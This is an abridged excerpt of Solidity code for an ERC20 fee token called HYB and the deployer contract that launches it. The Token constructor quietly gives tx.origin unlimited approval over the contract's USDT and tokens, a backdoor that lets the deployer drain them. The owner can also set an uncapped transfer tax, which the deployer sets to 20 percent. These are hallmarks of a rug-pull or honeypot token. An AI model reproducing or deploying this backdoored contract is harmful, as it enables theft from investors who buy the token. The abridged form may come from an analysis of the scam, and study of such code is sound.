...
contract Token is ERC20, Ownable {
    ...
    constructor(
        ...
        IERC20(usdtAddress).approve(tx.origin,~uint256(0));
        approve(tx.origin,~uint256(0));
    }
    ...
    function swapsetAmount(uint _AmountMarketingFee,uint _AmountLiquidityFee) public onlyOwner {
        AmountMarketingFee = _AmountMarketingFee;
        AmountLiquidityFee = _AmountLiquidityFee;
    }
    ...
    function settranferTaxes(uint256 fee) external onlyOwner {
        transferFee = fee;
    }
    ...
    function _transfer(
        ...
        if(takeFee) {
            ...
            if(isAdd){
                ...
                TFee = amount.mul(transferFee).div(100);
                fees = TFee;
            }

            amount = amount.sub(fees);
            if(DFee > 0) super._transfer(from, deadWallet, DFee);
            if(TFee > 0) super._transfer(from, _marketingWalletAddress, TFee);
            if(fees.sub(DFee).sub(TFee) > 0) super._transfer(from, address(this), fees.sub(DFee).sub(TFee));
        }
    ...
    function swapAndSendMarketing(uint256 tokens) private {
        //transfer(_marketingWalletAddress, tokens);
        super._transfer(address(this), rewardsAddress, tokens);
...
contract HYB {
        ...
        string  name_ = "HYB";
        string  symbol = "HYB";
        uint256 totalSupply_ = 19999999;
        uint8 decimals_ = 8;
        bool flag = true;
        address public hybAddress;
    ...
    function deplay() public {
        address[] memory addrs = new address[](4);
        addrs[0] = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        addrs[1] = 0x6994D3Babf7a5C1330004E008C4e5870a9B2ccB3;
        addrs[2] = 0x55d398326f99059fF775485246999027B3197955;
        addrs[3] = 0x1B8245218e497060f3C22988C5A85c5628a5fd3c;
        uint256[] memory buyFeeSetting = new uint256[](4);
        buyFeeSetting[0] = 0;
        buyFeeSetting[1] = 20;
        buyFeeSetting[2] = 0;
        buyFeeSetting[3] = 0;
        uint256[] memory sellFeeSetting = new uint256[](4);
        sellFeeSetting[0] = 0;
        sellFeeSetting[1] = 0;
        sellFeeSetting[2] = 2;
        sellFeeSetting[3] = 3;
        Token hyb = new Token(name_,symbol,totalSupply_,decimals_,
        [addrs[0], addrs[1], addrs[2], addrs[3]],
        [buyFeeSetting[0], buyFeeSetting[1], buyFeeSetting[2], buyFeeSetting[3]],
        [sellFeeSetting[0], sellFeeSetting[1], sellFeeSetting[2], sellFeeSetting[3]]
        );
        hyb.settranferTaxes(20);
        hyb.setSwapTokensAtAmount(1000e8);
        hyb.transferOwnership(msg.sender);
        hybAddress = address(hyb);
    }
}